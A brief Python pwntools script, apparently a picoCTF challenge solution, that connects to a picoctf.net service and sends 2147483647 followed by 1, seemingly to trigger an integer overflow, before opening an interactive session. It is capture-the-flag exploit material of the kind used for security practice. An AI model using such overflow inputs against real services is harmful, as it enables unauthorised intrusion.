from pwn import *

# r = process('./output')
HOST, PORT = 'saturn.picoctf.net 56111'.split()
r = remote(HOST, PORT)

r.recvuntil(b': \n')
r.sendline(b'2147483647')
r.sendline(b'1')

r.interactive()